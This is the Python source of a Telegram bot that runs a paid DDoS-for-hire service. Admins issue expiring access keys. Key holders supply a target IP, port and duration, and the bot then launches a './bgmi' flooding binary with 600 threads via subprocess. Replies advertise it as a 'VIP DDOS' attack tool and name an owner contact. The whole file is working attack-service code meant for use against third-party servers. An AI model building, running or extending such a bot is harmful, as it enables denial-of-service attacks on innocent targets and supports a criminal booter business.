import subprocess
import json
import os
import random
import string
import datetime
import asyncio
import time
from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
from rajaji import BOT_TOKEN, ADMIN_IDS, OWNER_USERNAME
from telegram import ReplyKeyboardMarkup, KeyboardButton
USER_FILE = "users.json"
KEY_FILE = "keys.json"
flooding_process = None
flooding_command = None
DEFAULT_THREADS = 600
users = {}
keys = {}

def load_data():
    global users, keys
    users = load_users()
    keys = load_keys()

def load_users():
    try:
        with open(USER_FILE, "r") as file:
            return json.load(file)
    except FileNotFoundError:
        return {}
    except Exception as e:
        print(f"Error loading users: {e}")
        return {}

def save_users():
    with open(USER_FILE, "w") as file:
        json.dump(users, file)

def load_keys():
    try:
        with open(KEY_FILE, "r") as file:
            return json.load(file)
    except FileNotFoundError:
        return {}
    except Exception as e:
        print(f"Error loading keys: {e}")
        return {}

def save_keys():
    with open(KEY_FILE, "w") as file:
        json.dump(keys, file)

def generate_key(length=6):
    characters = string.ascii_letters + string.digits
    return ''.join(random.choice(characters) for _ in range(length))

def add_time_to_current_date(hours=0, days=0):
    return (datetime.datetime.now() + datetime.timedelta(hours=hours, days=days)).strftime('%Y-%m-%d %H:%M:%S')
    
async def genkey(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = str(update.message.from_user.id)
    if user_id in ADMIN_IDS:
        command = context.args
        if len(command) == 2:
            try:
                time_amount = int(command[0])
                time_unit = command[1].lower()
                if time_unit == 'hours':
                    expiration_date = add_time_to_current_date(hours=time_amount)
                elif time_unit == 'days':
                    expiration_date = add_time_to_current_date(days=time_amount)
                else:
                    raise ValueError("Invalid time unit")
                key = generate_key()
                keys[key] = expiration_date
                save_keys()
                response = f"🔑 𝙂𝙀𝙉𝙆𝙀𝙔\n {key}\n⏳ 𝙑𝘼𝙇𝙄𝘿𝙄𝙏𝙔\n {expiration_date}\n\n𝙀𝙉𝙏𝙀𝙍 𝙆𝙀𝙔 𝘽𝙊𝙏 𝙇𝙄𝙆𝙀 --> \n/redeem"
            except ValueError:
                response = f"𝙐𝙨𝙖𝙜𝙚-> /𝙜𝙚𝙣𝙠𝙚𝙮 30 𝙙𝙖𝙮𝙨"
        else:
            response = "𝙐𝙨𝙖𝙜𝙚-> /𝙜𝙚𝙣𝙠𝙚𝙮 30 𝙙𝙖𝙮𝙨"
    else:
        response = f"𝙊𝙉𝙇𝙔 𝙊𝙒𝙉𝙀𝙍 𝘾𝘼𝙉 𝙐𝙎𝙀❌𝙊𝙒𝙉𝙀𝙍 𝙊𝙒𝙉𝙀𝙍-> @Ayush143"

    await update.message.reply_text(response)

async def redeem(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = str(update.message.from_user.id)
    command = context.args
    if len(command) == 1:
        key = command[0]
        if key in keys:
            expiration_date = keys[key]
            if user_id in users:
                user_expiration = datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S')
                new_expiration_date = max(user_expiration, datetime.datetime.now()) + datetime.timedelta(hours=1)
                users[user_id] = new_expiration_date.strftime('%Y-%m-%d %H:%M:%S')
            else:
                users[user_id] = expiration_date
            save_users()
            del keys[key]
            save_keys()
            response = f"🔑 𝙎𝙐𝘾𝘾𝙀𝙎𝙎𝙁𝙐𝙇 𝙆𝙀𝙔 𝙍𝙀𝘿𝙀𝙀𝙈"
        else:
            response = f"✅𝙊𝙒𝙉𝙀𝙍- @Ayush143"
    else:
        response = f"𝙐𝙨𝙖𝙜𝙚-> /𝙧𝙚𝙙𝙚𝙚𝙢"

    await update.message.reply_text(response)


async def bgmi(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    global flooding_command
    user_id = str(update.message.from_user.id)

    if user_id not in users or datetime.datetime.now() > datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S'):
        await update.message.reply_text("🔑 𝙉𝙊 𝘼𝙋𝙋𝙍𝙊𝙑𝘼𝙇 𝘽𝙀𝙔 𝙏𝙊 𝘿𝙈-> @Ayush143")
        return

    if len(context.args) != 3:
        await update.message.reply_text('🚀 𝙐𝙨𝙖𝙜𝙚->  /𝘽𝙂𝙈𝙄 𝙄𝙋 𝙋𝙊𝙍𝙏 𝙏𝙄𝙈𝙀')
        return

    target_ip = context.args[0]
    port = context.args[1]
    duration = context.args[2]

    flooding_command = ['./bgmi', target_ip, port, duration, str(DEFAULT_THREADS)]
    await update.message.reply_text(f'🚀 𝘼𝙏𝙏𝘼𝘾𝙆 𝙋𝙀𝙉𝘿𝙄𝙉𝙂 🚀\n\n💣𝙃𝙊𝙎𝙏-> {target_ip}\n💣𝙋𝙊𝙍𝙏-> {port} \n💣𝙏𝙄𝙈𝙀-> {duration}\n\n🇮🇳 𝙑𝙄𝙋 𝘿𝘿𝙊𝙎')


async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    global flooding_process, flooding_command
    user_id = str(update.message.from_user.id)

    if user_id not in users or datetime.datetime.now() > datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S'):
        await update.message.reply_text("𝙏𝙊𝙋 𝙏𝙊 𝘾𝙊𝙈𝙈𝙀𝙉𝙏-> /RAJA\n\n✅𝙊𝙒𝙉𝙀𝙍- @Ayush143")
        return

    if flooding_process is not None:
        await update.message.reply_text('🚀 𝘼𝙏𝙏𝘼𝘾𝙆 𝙋𝙀𝙉𝘿𝙄𝙉𝙂->\n\n𝙏𝙊𝙋 𝙏𝙊 𝙎𝙏𝙊𝙋-> /stop')
        return

    if flooding_command is None:
        await update.message.reply_text('𝙏𝙊𝙋 𝙏𝙊 𝘾𝙊𝙈𝙈𝙀𝙉𝙏-> /RAJA\n\n✅𝙊𝙒𝙉𝙀𝙍- @Ayush143')
        return

    flooding_process = subprocess.Popen(flooding_command)
    await update.message.reply_text('🚀 𝘼𝙏𝙏𝘼𝘾𝙆 𝙎𝙏𝘼𝙍𝙏 🚀\n🥇𝙋𝙍𝙄𝙈𝙄𝙐𝙈 𝙐𝙎𝙀𝙍🥇\n𝙁𝘿𝘽𝙆-> @Ayush143\n\n🇮🇳 𝙑𝙄𝙋 𝘿𝘿𝙊𝙎')


async def stop(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    global flooding_process
    user_id = str(update.message.from_user.id)

    if user_id not in users or datetime.datetime.now() > datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S'):
        await update.message.reply_text("𝙏𝙊𝙋 𝙏𝙊 𝘾𝙊𝙈𝙈𝙀𝙉𝙏-> /RAJA\n\n✅𝙊𝙒𝙉𝙀𝙍- @Ayush143")
        return

    if flooding_process is None:
        await update.message.reply_text('❌ 𝙀𝙍𝙍𝙊𝙍 ❌')
        return

    flooding_process.terminate()
    flooding_process = None
    await update.message.reply_text('🛑 𝘼𝙏𝙏𝘼𝘾𝙆 𝙎𝙏𝙊𝙋 🛑\n\n𝙏𝙊𝙋 𝙏𝙊 𝙎𝙏𝘼𝙍𝙏-> /start')
    
    await update.message.reply_text(response)

# Update the RAJA_command function to include buttons
async def RAJA_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    markup = ReplyKeyboardMarkup(
        [
            [KeyboardButton("/bgmi"), KeyboardButton("/start")],
            [KeyboardButton("/stop")]
        ],
        resize_keyboard=False
    )
    
    response = (
        "🥇𝙋𝙍𝙄𝙈𝙄𝙐𝙈 𝙐𝙎𝙀𝙍🥇\n\n"
        "/genkey-> 🔑 𝙂𝙀𝙉𝙆𝙀𝙔\n"
        "/redeem-> 🔐 𝙍𝙀𝘿𝙀𝙀𝙈\n"
        "/bgmi-> 🚀 𝘼𝙏𝙏𝘼𝘾𝙆\n"
        "/start-> 🚀 𝙎𝙏𝘼𝙍𝙏 𝘼𝙏𝙏𝘼𝘾𝙆\n"
        "/stop-> 🛑 𝙎𝙏𝙊𝙋 𝘼𝙏𝙏𝘼𝘾𝙆\n\n"
        f"✅𝙊𝙒𝙉𝙀𝙍-> {OWNER_USERNAME}"
    )
    await update.message.reply_text(response, reply_markup=markup)


def main() -> None:
   application = ApplicationBuilder().token(BOT_TOKEN).build()

   application.add_handler(CommandHandler("genkey", genkey))
   application.add_handler(CommandHandler("redeem", redeem))
   application.add_handler(CommandHandler("bgmi", bgmi))
   application.add_handler(CommandHandler("start", start))
   application.add_handler(CommandHandler("stop", stop))
   application.add_handler(CommandHandler("RAJA", RAJA_command))

   load_data()
   application.run_polling()

if __name__ == '__main__':
   # Start the bot in a separate thread or process to allow the background loop to run simultaneously.
   import threading
   
   def run_bot():
       main()

   bot_thread = threading.Thread(target=run_bot)
   bot_thread.start()

   # Background loop to keep the script running and print status.
   while True:
       print("Still running...")
       time.sleep(60)  # Adjust the interval as needed.
        
